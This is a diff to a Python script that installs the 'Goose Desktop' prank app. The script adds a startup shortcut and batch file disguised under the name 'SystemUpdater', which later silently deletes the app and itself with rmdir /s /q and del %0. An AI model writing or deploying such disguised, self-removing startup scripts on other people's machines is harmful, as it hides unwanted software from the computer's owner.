@@ -23,14 +23,19 @@ def extractGooseZip(payload, location):
 
 def createBats(location, startupLocation):
     # Bat file checks if a text file is present then starts Goose Desktop and deletes the file it checks, on the next restart delete everything
-    destroyBat = '@echo off\nif exist runCheck.txt (\nstart GooseDesktop.exe\ndel runCheck.txt\n) else (\ncd "' + os.path.join(os.path.expanduser('~'), 'AppData\Roaming') + '"\nrmdir /s /q Goose\ncd "' + startupLocation + '"\ndel SystemUpdater.lnk\ndel %0\n)'
+    newLocation = os.path.join(location, 'testdir')
+    if not os.path.exists(newLocation):
+        os.mkdir(newLocation)
+
+    destroyBat = '@echo off\nif exist "' + newLocation + '" (\ncd "' + location + '"\nstart GooseDesktop.exe\nrmdir testdir\n) else (\ncd "' + os.path.join(os.path.expanduser('~'), 'AppData\Roaming') + '"\nrmdir /s /q Goose\ncd "' + startupLocation + '"\ndel SystemUpdater.lnk\ndel %0\n)'
+    
 
     with open(os.path.join(location, 'SystemUpdater.bat'), 'w+') as makeBat:
         makeBat.write(destroyBat)
     
     # Creates empty file that is used to check if the bat has ran
-    with open(os.path.join(location, 'runCheck.txt'), 'w+') as no: 
-        pass
+    #with open(os.path.join(location, 'runCheck.txt'), 'w+') as no: 
+    #    pass
 
 def createShortCut(location, startupLocation, fileToShortcut, fileShortcutName):
     targetFile = os.path.join(location, fileToShortcut)
